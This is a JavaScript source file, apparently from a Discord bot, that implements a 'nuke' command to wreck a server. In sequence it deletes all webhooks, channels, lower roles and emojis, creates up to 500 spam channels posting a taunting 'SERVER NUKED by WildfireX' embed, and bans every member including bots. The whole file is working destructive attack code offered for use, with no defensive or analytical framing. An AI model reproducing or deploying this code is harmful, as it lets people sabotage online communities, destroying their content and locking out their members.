// src/commands/nuke.js
// Core nuke logic — exported as a plain async function.
// Called by the znuke prefix command in index.js.

import { EmbedBuilder } from 'discord.js';

// ─── Build the nuke announcement embed ────────────────────────────────────────
export function buildNukeEmbed(channelName) {
  return new EmbedBuilder()
    .setColor(0xff0000)  // pure red
    .setTitle('💥 SERVER NUKED')
    .setDescription('This server has been nuked by WildfireX')
    .addFields(
      { name: 'Channel Name', value: channelName, inline: false },
      { name: 'Nuked By',     value: 'your dad',  inline: false },
      {
        name: 'Timestamp',
        value: new Date().toLocaleString('en-GB', {
          weekday: 'long', year: 'numeric', month: 'long',
          day: 'numeric', hour: '2-digit', minute: '2-digit',
        }),
        inline: false,
      },
    )
    .setFooter({ text: 'WildfireX Security' });
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Run an array of async tasks in parallel, collect results.
 * Uses allSettled so one failure doesn't abort the rest.
 */
async function runAll(tasks) {
  const results = await Promise.allSettled(tasks);
  const succeeded = results.filter((r) => r.status === 'fulfilled').length;
  const failed    = results.filter((r) => r.status === 'rejected').length;
  return { succeeded, failed };
}

// ─── Main wipe logic ──────────────────────────────────────────────────────────

/**
 * Wipes a Discord guild: webhooks → channels → roles → emojis → members (ban all, including bots).
 * @param {import('discord.js').Guild} guild   The target guild object.
 * @param {string}                    botId   The bot's own user ID (to skip itself only).
 * @param {number}                    channelsToCreate  How many spam channels to create.
 * @param {string}                    channelName       Name for the spam channels.
 * @returns {Promise<string[]>}                Log lines describing what happened.
 */
export async function nukeServer(guild, botId, channelsToCreate = 0, channelName = 'nuked') {
  const log = [];

  // 1. Webhooks
  {
    const channels = guild.channels.cache.filter(
      (c) => c.isTextBased && typeof c.fetchWebhooks === 'function',
    );
    const webhookTasks = [];
    for (const ch of channels.values()) {
      const hooks = await ch.fetchWebhooks().catch(() => null);
      if (hooks) hooks.forEach((wh) => webhookTasks.push(wh.delete().catch(() => {})));
    }
    const { succeeded, failed } = await runAll(webhookTasks);
    log.push(`🪝 **Webhooks** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 2. Channels
  {
    const tasks = guild.channels.cache.map((ch) => ch.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`📢 **Channels** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 3. Roles (skip @everyone and roles above the bot)
  {
    const botMember  = await guild.members.fetch(botId);
    const botTopRole = botMember.roles.highest.position;
    const roles = guild.roles.cache.filter(
      (r) => r.id !== guild.id && r.position < botTopRole,
    );
    const tasks = roles.map((r) => r.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`🎭 **Roles** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 4. Emojis
  {
    const tasks = guild.emojis.cache.map((e) => e.delete().catch(() => {}));
    const { succeeded, failed } = await runAll(tasks);
    log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
  }

  // 5. Spam channels creation + post nuke embed in each
  if (channelsToCreate > 0) {
    const count = Math.min(channelsToCreate, 500);
    const embed = buildNukeEmbed(channelName);
    const createTasks = Array.from({ length: count }, async () => {
      try {
        const ch = await guild.channels.create({ name: channelName });
        if (ch && typeof ch.send === 'function') {
          await ch.send({ embeds: [embed] }).catch(() => {});
        }
      } catch { /* ignore */ }
    });
    const results   = await Promise.allSettled(createTasks);
    const succeeded = results.filter((r) => r.status === 'fulfilled').length;
    const failed    = results.filter((r) => r.status === 'rejected').length;
    log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
  }

  // 6. Members — BAN ALL (including bots), skip the bot itself only
  {
    let membersFetched = true;
    await guild.members.fetch().catch((err) => {
      console.warn('[nuke] Could not fetch members (missing Server Members Intent?):', err.message);
      membersFetched = false;
    });

    if (membersFetched) {
      // Include bots — only skip the nuke bot itself
      const members = guild.members.cache.filter((m) => m.id !== botId);
      const tasks   = members.map((m) =>
        m.ban({ reason: 'Server nuke' }).catch(() => {}),
      );
      const { succeeded, failed } = await runAll(tasks);
      log.push(
        `🔨 **Members Banned** — \`${succeeded}\` banned (including bots), failed \`${failed}\``,
      );
    } else {
      log.push('⚠️ **Members** — Skipped (Server Members Intent not enabled in Developer Portal).');
    }
  }

  return log;
}
